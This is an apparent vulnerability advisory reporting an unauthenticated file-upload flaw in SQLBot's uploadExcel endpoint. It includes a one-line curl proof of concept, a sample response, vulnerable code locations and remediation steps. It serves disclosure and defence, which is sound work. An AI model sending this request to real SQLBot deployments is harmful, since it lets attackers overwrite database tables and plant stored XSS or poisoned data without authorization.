# Unauthenticated Arbitrary File Upload in SQLBot uploadExcel Endpoint

## 1. Vulnerability Title
Unauthenticated Arbitrary File Upload in SQLBot uploadExcel Endpoint

## 2. Product Details
* **Vendor:** DataEase / FIT2CLOUD
* **Product:** SQLBot
* **Affected Version(s):** <= 1.3.0
* **Fixed Version:** N/A (unfixed at time of disclosure)

## 3. Vulnerability Type (CWE)
* **CWE ID:** CWE-306
* **Type Name:** Missing Authentication for Critical Function

## 4. Description
SQLBot version 1.3.0 and earlier contains a missing authentication vulnerability in the `/api/v1/datasource/uploadExcel` endpoint, allowing a remote unauthenticated attacker to upload arbitrary Excel/CSV files and inject data directly into the PostgreSQL database.

The endpoint is explicitly added to the authentication whitelist at `backend/common/utils/whitelist.py:36`, causing the `TokenMiddleware` at `backend/apps/system/middleware/auth.py:32` to bypass all token validation. Uploaded files are parsed by pandas and inserted into the database via `to_sql()` with `if_exists='replace'` mode.

## 5. Impact
* **Impact Description:** Allows unauthenticated attackers to inject arbitrary data into the application database, potentially leading to stored XSS attacks, data poisoning of AI/LLM components, database pollution, and disk exhaustion (uploaded files are never deleted).

## 6. Proof of Concept

```bash
# Upload malicious CSV without authentication
curl -X POST "http://<target>:8000/api/v1/datasource/uploadExcel" \
  -F "file=@malicious.csv"
```

**Expected Response (HTTP 200):**

```json
{
    "code": 0,
    "data": {
        "filename": "malicious_a1b2c3d4e5.csv",
        "sheets": [
            {
                "tableName": "Sheet1_bcd95768bc",
                "tableComment": ""
            }
        ]
    },
    "msg": null
}
```

## 7. Vulnerable Code Reference
* **Whitelist Entry:** `backend/common/utils/whitelist.py` line 36
* **Vulnerable Endpoint:** `backend/apps/datasource/api/datasource.py` lines 275-308
* **Auth Bypass Logic:** `backend/apps/system/middleware/auth.py` lines 30-33

## 8. Remediation
1. Remove `/datasource/uploadExcel` from the whitelist in `backend/common/utils/whitelist.py`
2. Implement proper authentication for the endpoint
3. Add server-side file size validation
4. Enable file cleanup (uncomment `os.remove()` at line 305)

## 9. References
* **Vendor Repository:** https://github.com/dataease/SQLBot
* **CWE-306:** https://cwe.mitre.org/data/definitions/306.html
